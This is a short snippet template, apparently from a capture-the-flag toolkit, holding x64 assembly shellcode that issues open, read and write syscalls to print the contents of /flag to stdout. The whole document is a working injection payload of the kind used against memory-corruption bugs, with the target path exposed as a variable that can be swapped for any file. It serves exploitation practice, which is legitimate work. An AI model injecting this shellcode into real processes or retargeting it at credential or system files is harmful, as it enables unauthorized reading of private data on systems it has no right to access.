# HEADER
# name: Open-Read-Write(x64)
# prefix: shellcode-open-read-write
# description: stdout.write(open("/flag").read())
# author: keymoon

# VARIABLES
# _flag_path: /flag
# _buf: bin

# BODY
"""
mov rax, 2;
lea rdi, [rel s_flag];
xor rsi, rsi;
xor rdx, rdx;
syscall;

mov edx, 0xff; flag length
mov edi, eax;
lea rsi, [rel s_buf];
xor eax, eax;
syscall;

xor edi, edi;
inc edi;
mov eax, edi;
syscall;
s_flag: db "_flag_path", 0;
s_buf: db 0;
"""
